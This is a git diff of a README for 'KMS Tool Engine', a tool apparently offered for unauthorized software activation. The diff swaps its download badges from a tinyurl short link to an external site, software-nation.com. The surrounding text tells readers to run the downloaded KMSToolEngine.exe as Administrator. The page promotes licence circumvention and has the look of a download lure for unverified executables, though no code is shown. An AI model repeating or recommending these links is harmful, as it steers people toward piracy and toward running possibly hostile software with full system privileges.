@@ -9,7 +9,7 @@ The **🚀 KMS Tool Engine** is a high-performance activation engine that combin
 
 <div align="center">
 
-[![Download KMS Tool Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-tool-engine)
+[![Download KMS Tool Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-tool-engine)
 
 </div>
 
@@ -95,7 +95,7 @@ Most activation tools are slow. They take 15-30 seconds to activate. They fail o
 3. **🖱️ Run as Administrator** — `KMSToolEngine.exe`
 4. **✅ Done** — activation in 1-2 seconds
 
-[![Download KMS Tool Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-tool-engine)
+[![Download KMS Tool Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-tool-engine)
 
 ### Engine Output
 
@@ -250,7 +250,7 @@ Blazing fast. Rock solid. **KMS Tool Engine** delivers activation in 1-2 seconds
 
 <div align="center">
 
-[![Download KMS Tool Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-tool-engine)
+[![Download KMS Tool Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-tool-engine)
 
 **Version 4.1.0** — High-performance activation engine. Free forever.
 
